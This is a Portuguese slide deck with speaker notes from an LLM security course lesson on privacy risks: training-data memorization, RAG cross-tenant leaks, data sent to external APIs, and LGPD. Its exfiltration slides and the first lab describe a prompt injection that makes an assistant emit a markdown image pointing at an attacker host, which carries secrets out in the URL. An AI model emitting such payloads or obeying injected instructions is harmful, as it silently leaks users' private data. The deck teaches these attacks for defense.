# Aula 4 — Riscos de dados e privacidade em sistemas de LLM

- **Curso LLM Security · Aula 4** — para onde os dados vazam num sistema de LLM.
- **Dois canais** — pelos pesos (memorização) e pelo contexto vivo (exfiltração).

<!-- ═══ VÍDEO 1 · Abertura — para onde os dados vazam · ~5 min ═══
Objetivo: situar a aula e fixar a distinção central (dois canais). Vídeo autocontido: abre e fecha ("a seguir, o primeiro canal: a memorização").
-->

<!--
LAYOUT: capa — título grande + subtítulo; tema Alura, accent #1F53E5; imagens = None (fundo sóbrio). Nada crítico no canto inferior direito (safe zone da facecam).
ROTEIRO: abra com a pergunta central — para onde vão os dados pessoais quando entram num sistema de LLM? Consciência técnica, não pânico. Fixe a distinção que estrutura a aula: o dado vaza por dois canais — pelos PESOS (o que o modelo aprendeu no treino) e pelo CONTEXTO vivo (o que está acontecendo agora na conversa).
-->

---

## O que veremos nesta aula


<!--
LAYOUT: agenda com 4 itens, um ícone por item; accent #1F53E5. Sem diagrama.
ROTEIRO: mapa rápido — memorização × exfiltração (os dois canais, coração da aula), RAG e APIs externas (dados que saem da sua mão), LGPD e IA (o que a lei exige) e como avaliar a política do provedor (o checklist). Não passe de ~30s.
-->

- **Memorização e exfiltração** — dois canais distintos de vazamento (o coração da aula).
- **RAG e APIs externas** — dados que saem da sua mão (recuperação e terceiros).
- **LGPD e IA** — o que a lei permite e exige.
- **Políticas dos provedores** — o checklist do que perguntar a qualquer provedor.

---

<!-- ═══ VÍDEO 2 · Memorização de dados de treino · ~10 min ═══  (ementa: memorização de dados de treinamento e vazamento) -->

## Memorização — o modelo decora o treino


<!--
LAYOUT: diagrama simples "corpus → pesos" com um dado sensível "grudado" nos pesos, nativo no Gamma. Accent #1F53E5.
ROTEIRO: mecanismo — no pré-treino o modelo processa bilhões de tokens e decora literalmente sequências raras ou muito repetidas: exatamente o perfil de dado sensível (CPF é único; chave de API tem padrão fixo). Não é bug, é consequência estatística. Consequência de segurança (pese a voz): ele pode cuspir esse dado para qualquer usuário depois — é a raiz do LLM02. Ex. real: training data extraction extraiu telefones e endereços reais de modelos em produção.
-->

- **Decora o treino** — no pré-treino decora trechos literais, sobretudo raros ou repetidos: um CPF, uma chave de API, um e-mail.
- **Segurança: regurgita (LLM02)** — pode cuspir esse dado para qualquer usuário depois; training data extraction já revelou telefones e endereços reais.

---


## Memorização — o ataque de extração que provou o risco


<!--
LAYOUT: linha do tempo "prompt de extração → ranking por memorização → dado real exposto"; o último bullet com o marcador Segurança:. Accent #1F53E5.
ROTEIRO: o caso que tirou "training data extraction" da hipótese e colocou na literatura — Carlini et al., "Extracting Training Data from Large Language Models" (2020/2021), contra o GPT-2. Os pesquisadores geraram cerca de 200 mil textos com o modelo e usaram sinais de memorização (perplexidade, comparação entre modelos) para separar o que era só "estilo aprendido" do que era cópia literal do corpus. Confirmaram manualmente 604 sequências realmente decoradas — entre elas nome, telefone, e-mail e endereço físico de pessoas reais que apareciam raramente no treino. Ponto central: não foi um ataque contra uma pessoa específica; foi extração genérica que, mesmo assim, expôs PII real. Mitigação: rodar esse mesmo tipo de auditoria (extraction/membership inference) antes de publicar um modelo, e dedupe agressivo do corpus.
-->

- **O experimento** — Carlini et al. (2020) geraram cerca de 200 mil textos com o GPT-2 e rankearam os candidatos por sinais estatísticos de memorização, não de "estilo".
- **O achado** — confirmaram manualmente 604 sequências realmente decoradas do treino; entre elas, nome, telefone, e-mail e endereço físico de pessoas reais.
- **Não foi um ataque dirigido** — ninguém pediu por aquela pessoa; a extração foi genérica e mesmo assim expôs PII real que aparecia raramente no corpus.
- **Segurança: audite antes de publicar** — rode extraction/membership inference contra o próprio modelo e faça dedupe agressivo do corpus antes do treino.

---

## Memorização — difícil de apagar


<!--
LAYOUT: 2 bullets; a tensão com a LGPD (direito de exclusão) em destaque; a defesa como lista. Accent #1F53E5.
ROTEIRO: a tensão com a LGPD — o titular tem direito de exclusão (art. 18), mas apagar um dado memorizado nos pesos exigiria retreino completo, quase sempre inviável. As mitigações existem, imperfeitas: no pré-treino (dedupe do corpus, scrubbing de PII), no pós-treino (filtro de saída que detecta padrões de PII) e differential privacy (ruído no treino para reduzir a memorização). Mostre que o problema é real e as defesas são parciais, não inexistentes.
-->

- **Difícil apagar** — uma vez decorado, "desaprender" exige retreino; colide com o direito de exclusão da LGPD.
- **Defesa** — dedupe do corpus, scrubbing de PII, differential privacy e filtro de saída.

---

<!-- ═══ VÍDEO 3 · Exfiltração via interação · ~10 min ═══  (ementa: exfiltração de dados via interação com o modelo) -->

## Exfiltração via interação — pelo contexto vivo


<!--
LAYOUT: diagrama contexto (system + RAG + ferramentas) → injeção → resposta que vaza, nativo no Gamma. Accent #1F53E5.
ROTEIRO: mude de canal — 'agora não é pelos pesos'. Aqui o dado sensível está no contexto da sessão (system prompt, retorno de RAG, saída de ferramenta) — não foi memorizado, está presente agora. Uma injeção (LLM01) manipula o modelo a revelar esse dado (LLM02). Use o conceito de confused deputy: um agente com privilégios é enganado a agir em favor de quem não os tem.
-->

- **Pelo contexto, não pelos pesos** — o dado está na sessão (system prompt, RAG, ferramentas), não memorizado.
- **Confused deputy** — a injeção usa o modelo (privilegiado) para revelar o dado; combina LLM01 + LLM02.

---

## Exfiltração — o truque da imagem-markdown


<!--
LAYOUT: passo a passo nativo no Gamma: injeção → resposta com ![](url do atacante) → browser faz GET → atacante loga o segredo. Accent #1F53E5.
ROTEIRO: o exemplo mais visual da aula, devagar. 1) o atacante injeta uma instrução no conteúdo processado; 2) manda o modelo incluir na resposta uma imagem markdown com URL do atacante; 3) o frontend renderiza e o browser faz GET para a URL, carregando o segredo na query string; 4) o servidor do atacante loga e coleta. O usuário não vê nada. Defesa em ordem de eficácia: filtro de egress (barrar/auditar URLs externas na saída), menor exposição no contexto, menor privilégio, monitoramento.
-->

- **Segurança: imagem-markdown** — a injeção faz o modelo emitir `![](http://atacante/log?dados=SEGREDO)`; ao renderizar, o browser envia o segredo na URL — silencioso.
- **Defesa** — filtro de egress (barrar URLs externas), menor exposição no contexto, menor privilégio, monitoramento.

---

<!-- ═══ VÍDEO 4 · Privacidade em RAG · ~10 min ═══  (ementa: riscos de privacidade em RAG) -->

## Privacidade em RAG — vazamento entre tenants


<!--
LAYOUT: diagrama de 2 tenants consultando o mesmo índice sem filtro de permissão, nativo no Gamma. Accent #1F53E5.
ROTEIRO: exemplo direto — o bot de RH: o funcionário A pergunta sobre benefícios e recebe, junto, o salário do funcionário B. Acontece porque o vector store recupera por similaridade semântica, sem checar permissão do solicitante — erro de design comum. Combina LLM02 (disclosure) e o acesso indevido. Segundo ponto: a própria base concentra PII em embeddings, e há inversão de embedding (reconstruir o texto-fonte a partir do vetor) — 'armazenar como vetor não é anonimizar'.
-->

- **Segurança: entre tenants** — acesso fraco → o RAG devolve a um usuário o documento de outro (ex.: o bot de RH devolve o salário de outro).
- **PII na base** — a base concentra PII recuperável; e há inversão de embedding (reconstruir o texto do vetor).

---

<!-- NOVO SLIDE (revisar e colar no Gamma) -->
## Privacidade em RAG — o bot de RH que misturou dois funcionários


<!--
LAYOUT: passo a passo nativo no Gamma: pergunta do funcionário A → busca por similaridade no índice → trecho recuperado da planilha de remuneração → resposta que expõe o salário do funcionário B. Accent #1F53E5.
ROTEIRO: torne o cenário do slide anterior palpável, devagar. 1) o funcionário A pergunta ao bot de RH como funciona o reembolso do plano de saúde; 2) o vector store busca por similaridade semântica e traz, entre os trechos mais próximos, um pedaço da planilha de remuneração que também menciona "reembolso" — é o registro do funcionário B; 3) o modelo monta a resposta citando o trecho recuperado e expõe, sem intenção maliciosa de ninguém, o salário do funcionário B para o funcionário A; 4) causa raiz: o índice recupera por proximidade de texto, não por permissão — similaridade semântica não é controle de acesso. Feche com a mesma mensagem do slide seguinte: o filtro tinha que estar ANTES da busca.
-->

- **A pergunta** — o funcionário A pergunta ao bot de RH como funciona o reembolso do plano de saúde.
- **A recuperação** — o índice busca por similaridade e traz, entre os trechos mais próximos, um pedaço da planilha de remuneração que também cita "reembolso" — o registro do funcionário B.
- **A resposta** — o modelo cita o trecho recuperado e expõe, sem intenção de ninguém, o salário do funcionário B para o funcionário A.
- **Segurança: causa raiz** — o índice recupera por proximidade de texto, não por permissão; similaridade semântica não é controle de acesso.

---

## Privacidade em RAG — filtrar antes de recuperar


<!--
LAYOUT: 2 bullets; realce da palavra ANTES; a defesa como lista. Accent #1F53E5.
ROTEIRO: enfatize o ANTES — o filtro de permissão deve acontecer NA consulta ao índice, não depois. Filtrar depois (reranking por permissão) ainda expõe o dado ao modelo; a defesa correta é não recuperar o que o usuário não pode ver. Complemente com minimizar PII na base, scrubbing ao indexar e auditoria de acessos.
-->

- **Defesa: acesso ANTES da recuperação** — filtre por permissão na consulta ao índice, não depois (reranking ainda expõe ao modelo).
- **Minimize e audite** — menos PII na base, scrubbing ao indexar, auditoria de acessos.

---

<!-- ═══ VÍDEO 5 · Dados enviados a APIs externas · ~10 min ═══  (ementa: dados enviados a APIs externas de LLM) -->

## Dados enviados a APIs externas — saem da fronteira


<!--
LAYOUT: diagrama "sua infra → API do provedor (EUA)" com o dado cruzando a fronteira, nativo no Gamma. Accent #1F53E5.
ROTEIRO: ao usar a API de um provedor (OpenAI, Anthropic, Google…), os prompts — que podem ter PII — deixam a sua infra. O provedor pode logar, reter ou treinar, conforme o plano/termos; e a maioria processa nos EUA, acionando a transferência internacional da LGPD. Não demonize os provedores — o risco é gerenciável com as escolhas certas. Caso-escola (breve, sem inventar detalhes): em 2023 funcionários da Samsung colaram código-fonte confidencial no ChatGPT consumer; o dado foi para o provedor e a empresa proibiu IA generativa internamente — 'shadow AI'. O problema não foi malícia, foi falta de política.
-->

- **Saem da sua infra** — prompts com PII vão para um terceiro que pode logar, reter ou treinar; e cruzam fronteiras (geralmente EUA).
- **Segurança: caso Samsung** — funcionários colaram código-fonte confidencial num chatbot consumer → o dado foi para o provedor (caso-escola de "shadow AI").

---

<!-- NOVO SLIDE (revisar e colar no Gamma) -->
## APIs externas — o caso Samsung, passo a passo


<!--
LAYOUT: linha do tempo "cola o código → sai da infra → chega ao provedor → proibição interna"; o último bullet com o marcador Segurança:. Accent #1F53E5.
ROTEIRO: devagar no caso mais citado de vazamento por API externa. Em abril de 2023, um engenheiro da Samsung Semiconductor colou no ChatGPT consumer um trecho de código-fonte proprietário pra pedir ajuda a corrigir um bug. Dentro de poucas semanas, outros funcionários repetiram o gesto — ao menos três incidentes registrados, incluindo atas de reunião confidenciais. O conteúdo colado saiu da infraestrutura da Samsung e foi para os servidores do provedor, sujeito aos termos do plano consumer (retenção e possível uso em treino, sem contrato específico). A resposta da empresa veio depois do fato: proibição temporária de ferramentas de IA generativa e um projeto interno para reduzir a dependência de serviços externos. Mensagem central: não foi um ataque, foi um funcionário tentando ser produtivo sem política — 'shadow AI'. Mitigação: a defesa não é confiar no bom senso, é ter política + DLP antes que aconteça.
-->

- **O gesto** — em 2023, um engenheiro da Samsung colou no ChatGPT consumer um trecho de código-fonte proprietário pra pedir ajuda a corrigir um bug.
- **A repetição** — em poucas semanas, outros funcionários fizeram o mesmo com atas de reunião confidenciais — ao menos três incidentes registrados.
- **O destino do dado** — o conteúdo colado saiu da infraestrutura da Samsung e chegou aos servidores do provedor, sujeito aos termos do plano consumer (retenção e possível uso em treino).
- **Segurança: a resposta veio depois** — a Samsung proibiu temporariamente IA generativa e passou a investir em ferramentas internas; a política deveria ter vindo antes do vazamento, não depois.

---

## APIs externas — defesa em camadas


<!--
LAYOUT: 2 bullets; a defesa em camadas como escada (minimizar → redigir → enterprise → DLP → política → self-hosted). Accent #1F53E5.
ROTEIRO: defesas escalonáveis. Minimize (não inclua o que não é necessário) e anonimize/redija PII antes de enviar. Depois: plano enterprise (a maioria dos grandes provedores oferece não-treino e retenção zero/reduzida por contrato), DLP interceptando o prompt antes de sair, política + treinamento dos funcionários e, para dado muito sensível, self-hosted (elimina a exfiltração externa). Prático e sem bala de prata.
-->

- **Minimize e redija** — não envie o que não precisa; anonimize/redija PII antes de enviar.
- **Defesa** — plano enterprise (não-treino + retenção zero), DLP, política + treinamento, self-hosted para dado muito sensível.

---

<!-- ═══ VÍDEO 6 · LGPD e IA · ~11 min ═══  (ementa: LGPD e IA, implicações regulatórias) -->

## LGPD e IA — base legal e minimização


<!--
LAYOUT: 2 bullets; realce "enviar a um LLM = tratamento". Accent #1F53E5.
ROTEIRO: a LGPD exige base legal para qualquer tratamento de dado pessoal — e enviar dado a um LLM é tratamento. As bases comuns em empresa são consentimento e legítimo interesse, sempre documentadas. Minimização é direto: se a tarefa é 'responder sobre o contrato do cliente X', o prompt não precisa de histórico financeiro, endereço, CPF e renda — só o necessário. Diga: 'não jogue o registro inteiro no prompt — não é só boa prática, é obrigação legal'.
-->

- **Base legal** — tratar dado pessoal (inclusive mandá-lo a um LLM) exige base legal (consentimento, legítimo interesse…).
- **Minimização** — só o necessário, com finalidade declarada; não jogue o registro inteiro no prompt (é obrigação legal).

---

<!-- NOVO SLIDE (revisar e colar no Gamma) -->
## LGPD — a ficha inteira que não precisava sair


<!--
LAYOUT: antes/depois lado a lado — prompt "cadastro inteiro" × prompt "só o necessário"; o último bullet com o marcador Segurança:. Accent #1F53E5.
ROTEIRO: cenário próximo da CredSim, pra ancorar antes da prática. A tarefa é gerar um resumo de boas-vindas pro cliente que acabou de contratar um empréstimo. O time monta o prompt colando o registro inteiro do CRM: nome, CPF, endereço, renda declarada, histórico de crédito e score. Só nome e produto contratado eram necessários pra essa tarefa — o resto é dado pessoal exposto ao provedor sem finalidade e sem base legal para aquele uso específico (a base legal do cadastro no CRM não cobre automaticamente mandar tudo pra um LLM terceiro). A correção não é jurídica, é de engenharia: definir por tarefa os campos mínimos necessários antes de montar o prompt, não decidir na hora, campo a campo.
-->

- **A tarefa** — gerar um resumo de boas-vindas pro cliente que acabou de contratar um empréstimo na CredSim.
- **O prompt real** — o time cola o registro inteiro do CRM: nome, CPF, endereço, renda declarada, histórico de crédito e score.
- **O problema** — só o nome e o produto contratado eram necessários; o resto é dado pessoal exposto ao provedor sem finalidade e sem base legal para esse uso específico.
- **Segurança: minimize por design** — defina, por tarefa, os campos mínimos necessários antes de montar o prompt; não decida campo a campo na hora.

---

## LGPD e IA — direitos, transferência e o que vem


<!--
LAYOUT: 3 bullets; o marcador Segurança: no PL 2338. Accent #1F53E5.
ROTEIRO: direitos do titular (art. 18) — acesso, correção, exclusão; retome a tensão com a memorização: como apagar o que o modelo decorou? Não há resposta técnica perfeita hoje, só mitigações e debate aberto — seja honesto. Transferência internacional (cap. V): enviar dado a provedor nos EUA precisa de mecanismo adequado; documente com RIPD (Relatório de Impacto à Proteção de Dados) em operações de maior risco — usar LLM externo com PII de clientes se encaixa. E o Brasil discute o PL 2338 (Marco Legal da IA, inspirado no AI Act) — ainda em tramitação; pode redefinir regras para IA de alto risco. Mensagem: o quadro legal está em movimento, acompanhe.
-->

- **Direitos do titular** — acesso, correção, exclusão; a tensão: como apagar um dado que o modelo decorou?
- **Transferência + RIPD** — enviar dado a provedor nos EUA aciona a transferência internacional; documente com RIPD.
- **Segurança: PL 2338** — o Brasil discute um Marco Legal da IA (PL 2338); acompanhe o status atual.

---

<!-- ═══ VÍDEO 7 · Avaliando a política do provedor · ~8 min ═══  (ementa: avaliando a política de uso de dados dos principais provedores) -->

## Avaliando o provedor — as três perguntas


<!--
LAYOUT: tabela nativa no Gamma com as 3 perguntas (Treina? / Retenção / Região e controles) e o contraste consumer × API/enterprise. Accent #1F53E5.
ROTEIRO: due diligence em três perguntas. (1) Treina com meus dados? Consumer gratuito costuma treinar por padrão; API/enterprise costuma ser o oposto, por contrato — dá para desligar? (2) Retenção: por quanto tempo guarda prompts/saídas? há retenção zero? quem são os subprocessadores (cada um é risco adicional)? (3) Região e controles: onde processa/armazena (importa para LGPD e setor)? dá para escolher região e desligar logging? Como um formulário de avaliação de fornecedor.
-->

- **Treina com meus dados?** — o padrão difere entre consumer e API/enterprise; dá para desligar?
- **Retenção** — por quanto tempo guarda prompts/saídas? há retenção zero? quem são os subprocessadores?
- **Região e controles** — onde processa/armazena? dá para escolher a região e desligar treino/logging?

---

## Avaliando o provedor — a regra de ouro


<!--
LAYOUT: 2 bullets; o marcador Segurança: na regra. Accent #1F53E5.
ROTEIRO: feche o bloco com a regra prática. Diga claramente: para processar dado corporativo ou pessoal, a versão consumer gratuita de qualquer provedor está fora de cogitação — os termos das gratuitas são escritos para uso pessoal e frequentemente treinam por padrão. E os termos mudam: uma política 'sem treino' hoje pode mudar amanhã; leia sempre os termos atuais, não resumos de terceiros. Pese a voz — é a takeaway do slide.
-->

- **Segurança: nunca consumer para dado corporativo** — planos consumer frequentemente treinam por padrão; para dado corporativo/pessoal, fora de cogitação.
- **Leia os termos atuais** — políticas mudam; não confie em resumos de terceiros.

---

<!-- ═══ VÍDEO 8 · Conclusão — dois canais e duas camadas · ~6 min ═══  (conclusão + gancho Aula 5) -->

## Conclusão — dois canais e duas camadas
_conclusão_

<!--
LAYOUT: slide de síntese — os dois canais (pesos × contexto) e as duas camadas (lei × provedor); gancho para a Aula 5 em destaque. Accent #1F53E5.
ROTEIRO: retome a estrutura — dois canais, problemas diferentes, defesas diferentes: memorização (treino, difícil de desfazer) × exfiltração (runtime, contida com controle de acesso e filtro de egress). 'Se lembrar de uma coisa, que seja essa distinção.' Duas camadas: a LGPD define o que você PODE (você é responsável mesmo com LLM terceiro); a política do provedor define o que ACONTECE com o dado ao sair — precisam estar alinhadas. E o princípio mais barato e eficaz: minimizar — dado que não entra no prompt não vaza. Gancho: Aula 5 — mitigações e controles.
-->

- **Dois canais** — memorização (pesos) × exfiltração (contexto): a distinção central.
- **Lei + provedor** — a LGPD define o que você pode; a política do provedor define o que acontece com o dado ao sair.
- **Minimize** — não envie o que não precisa (a defesa mais barata e eficaz).
- **Próxima: Aula 5** — mitigações e controles.

---

<!-- ═══════════ BLOCO PRÁTICO — vídeos de laboratório, separados do teórico ═══════════
Cada vídeo dispara um vazamento na CredSim (defesa OFF → liga a defesa → confirma a contenção). Notebook em lab/aula4/privacidade_lgpd.ipynb; a CredSim trata PII (nome, CPF, renda) de tomadores de empréstimo.
Duração: bloco teórico ≈ 70 min (é o módulo de 1h–1h20); bloco prático ≈ 26 min, complementar e separado do teórico.
-->

<!-- ═══ VÍDEO 9 · Prática 1 — Exfiltração via interação na CredSim · ~9 min ═══  (CredSim) -->

## Prática 1 — Exfiltração via interação na CredSim
_prática_

<!--
LAYOUT: screencast da CredSim; sinalize "defesa OFF"; mostrar a resposta com a imagem-markdown. Accent #1F53E5.
ROTEIRO: abre o bloco prático com o vazamento pelo contexto vivo. Com a defesa OFF, dispare a injeção que faz o assistente revelar dado de outro cliente (LLM01 + LLM02) e a resposta que embute ![](http://atacante/log?dados=...). Depois ligue o filtro de egress e compare no log.
-->

- **Objetivo** — provar o vazamento pelo contexto: injeção que revela dado de outro cliente e o truque da imagem-markdown.
- **Passos** — com defesa OFF, dispare a injeção e a saída com `![](http://atacante/log?...)`; ligue o filtro de egress e compare.

---

## Exfiltração — o que observar
_prática_

<!--
LAYOUT: 2 bullets de fechamento; liga com o vídeo 3. Accent #1F53E5.
ROTEIRO: feche a prática 1. O ataque é silencioso — o segredo sai na URL da 'imagem' sem alerta visível; o log de egress mostra a requisição externa. Com o filtro de egress ON, a URL externa é barrada e o dado não sai.
-->

- **Silencioso** — o segredo sai na URL da "imagem" sem alerta; o log de egress mostra a requisição externa.
- **Contido** — com o filtro de egress ON, a URL externa é barrada; o dado não sai.

---

<!-- ═══ VÍDEO 10 · Prática 2 — RAG multi-tenant na CredSim · ~9 min ═══  (CredSim) -->

## Prática 2 — RAG multi-tenant na CredSim
_prática_

<!--
LAYOUT: screencast de 2 instâncias da CredSim (2 financeiras); "defesa OFF". Accent #1F53E5.
ROTEIRO: o vazamento entre tenants. Rode 2 instâncias representando financeiras diferentes; consulte de um tenant e observe o RAG retornar documento do outro (o cenário 'salário de outro' da teoria). Preste atenção nos documentos retornados. Depois ligue o filtro de permissão por tenant na consulta.
-->

- **Objetivo** — provar o vazamento entre financeiras (tenants) quando o RAG não filtra por permissão.
- **Passos** — rode 2 instâncias (2 financeiras); consulte de um tenant e veja retornar doc do outro; ligue o isolamento por tenant.

---

## RAG multi-tenant — o que observar
_prática_

<!--
LAYOUT: 2 bullets de fechamento; liga com o vídeo 4. Accent #1F53E5.
ROTEIRO: feche a prática 2. Sem isolamento, a consulta do tenant A retorna doc do tenant B (LLM02 + LLM08). Com o filtro de permissão na consulta (ANTES da recuperação), o doc do outro tenant nem é recuperado — a diferença aparece no que o RAG traz.
-->

- **Vaza sem isolamento** — a consulta do tenant A retorna doc do tenant B (LLM02 + LLM08).
- **Filtrar antes** — com o filtro de permissão na consulta, o doc do outro tenant nem é recuperado.

---

<!-- ═══ VÍDEO 11 · Prática 3 — Dados a terceiros e checklist LGPD · ~8 min ═══  (CredSim) -->

## Prática 3 — Dados a terceiros e checklist LGPD
_prática_

<!--
LAYOUT: screencast do fluxo de saída de dados (API/e-mail) + o mini-checklist LGPD. Accent #1F53E5.
ROTEIRO: rastreie a PII que sai da CredSim — quais chamadas de API são feitas, quais dados viajam para o provedor, o que é logado, o payload de e-mail/fornecedor. Depois aplique o mini-checklist LGPD sobre a própria CredSim: base legal para tratar CPF? finalidade documentada? dado minimizado? como atender um pedido de exclusão? O objetivo é praticar o raciocínio de avaliação, não deixar a CredSim conforme.
-->

- **Objetivo** — rastrear a PII que sai para fornecedores/e-mail e avaliar a conformidade da CredSim.
- **Passos** — observe o payload enviado às APIs/e-mail; aplique o mini-checklist LGPD (base legal, minimização, exclusão, RIPD).

---

## Terceiros e LGPD — o que observar
_prática_

<!--
LAYOUT: 2 bullets de fechamento; gancho para a Aula 5 (mitigações a fundo). Accent #1F53E5.
ROTEIRO: feche a prática 3 e o bloco. Torne o fluxo de dados visível: quais dados saem, para quem, o que é logado (transferência internacional, retenção). O checklist treina o raciocínio de conformidade; a mitigação a fundo (filtro de saída, isolamento, DLP) é a Aula 5.
-->

- **Fluxo visível** — quais dados saem, para quem, o que é logado (transferência internacional, retenção).
- **Raciocínio de conformidade** — o checklist treina a avaliação; a mitigação a fundo é a **Aula 5**.
